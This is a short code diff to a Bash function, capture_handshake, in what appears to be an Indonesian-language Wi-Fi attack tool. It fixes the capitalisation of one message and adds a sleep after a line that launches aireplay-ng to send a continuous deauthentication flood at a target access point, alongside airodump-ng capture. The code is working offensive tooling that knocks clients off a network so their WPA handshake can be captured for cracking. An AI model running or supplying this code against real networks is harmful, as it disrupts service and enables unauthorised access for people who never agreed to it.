@@ -287,7 +287,7 @@ function capture_handshake(){
                         continue
                 fi
                 if ! [[ "${bssid_target}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                        echo "[-] Format BSSID tidak valid harap masukkan dengan format (XX:XX:XX:XX:XX:XX). silahkan masukkan lagi."
+                        echo "[-] Format BSSID tidak valid harap masukkan dengan format (XX:XX:XX:XX:XX:XX). Silahkan masukkan lagi."
                         continue
                 fi
                 echo "[+] BSSID -> ${bssid_target}"
@@ -348,6 +348,8 @@ function capture_handshake(){
 
         xterm -geometry 100x20+0+300 -e aireplay-ng -0 0 -a "${bssid_target}" "${pilih_interface}" &
         aireplay_pid=$!
+
+        sleep "${lama_waktu}"
 
         if ps -p $airodump_pid > /dev/null 2>&1; then
                 kill $airodump_pid 2>/dev/null
